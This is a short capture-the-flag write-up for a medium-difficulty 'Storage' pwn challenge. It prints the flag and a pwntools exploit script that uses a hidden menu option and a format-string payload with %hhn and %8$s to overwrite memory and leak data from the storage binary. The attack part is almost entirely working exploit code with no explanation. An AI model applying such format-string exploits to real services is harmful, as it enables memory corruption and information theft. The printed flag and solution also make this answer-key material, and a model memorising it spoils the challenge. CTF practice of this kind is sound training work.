# PWN - Storage
**Author** : Lazar Mancic  
**Difficulty**: <font color='yellow'>Medium</font>  
**Description**: Simple storage app, you can store, delete or read text.

**Flag**: ``SCC{n07h1n6_15_r34lly_h1dd3n_fr0m_f0rm47t3d_pr1n7!}``

# Writeup

## Solution
```py
from pwn import *

HOST = args.HOST or "localhost"
PORT = int(args.PORT or "1337")
FLAG = args.FLAG

context.log_level = 'ERROR'

if args.REMOTE:
    p = remote(HOST, PORT)
else:
    p = process("./storage")

if args.GDB:
    context.terminal = "st"
    gdb.attach(p)

p.sendlineafter(b"> ", b"4919")
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"text: ", b"30")
p.sendlineafter(b"content: ", b"%c%c%c%c%c%c%c%c%120c%hhn%8$s")

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"text: ", b"0")

p.interactive()
```